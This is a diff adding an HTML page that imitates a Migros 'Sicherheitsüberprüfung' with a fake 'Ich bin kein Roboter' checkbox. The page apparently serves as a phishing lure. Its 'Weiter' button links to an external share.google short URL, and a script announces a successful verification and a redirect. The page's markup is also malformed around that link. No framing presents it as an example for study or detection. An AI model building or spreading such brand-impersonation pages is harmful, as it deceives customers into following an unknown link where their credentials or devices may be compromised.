@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifizierung – Migros</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="carte">
+
+    <div class="bandeau-haut">
+      Geprüfte Kundendaten
+    </div>
+
+    <div class="zone-logo">
+      <div class="logo-migros">
+        <div class="nom">MIGROS</div>
+        <div class="sous-titre">Sicherheitsüberprüfung</div>
+      </div>
+    </div>
+
+    <div class="contenu">
+
+      <h1 class="titre">Sicherheitsüberprüfung</h1>
+
+      <p class="texte">
+        Um fortzufahren, bestätigen Sie bitte, dass Sie kein Roboter sind.
+      </p>
+
+      <div class="captcha">
+        <input type="checkbox" id="pas-robot">
+        <label for="pas-robot">Ich bin kein Roboter</label>
+      </div>
+
+      <button class="bouton" type="button" onclick="verifier()"><a href="https://share.google/dpGjd7fS4IxjIkOum"></a>Weiter</a></button>
+
+      <div class="pied">
+        © 2026 · Migros · Alle Rechte vorbehalten
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    function verifier() {
+      const caseCochee = document.getElementById('pas-robot').checked;
+      if (!caseCochee) {
+        alert("Bitte aktivieren Sie das Kontrollkästchen, um fortzufahren.");
+        return;
+      }
+      alert("Verifizierung erfolgreich. Sie werden weitergeleitet …");
+    }
+  </script>
+
+</body>
+</html>
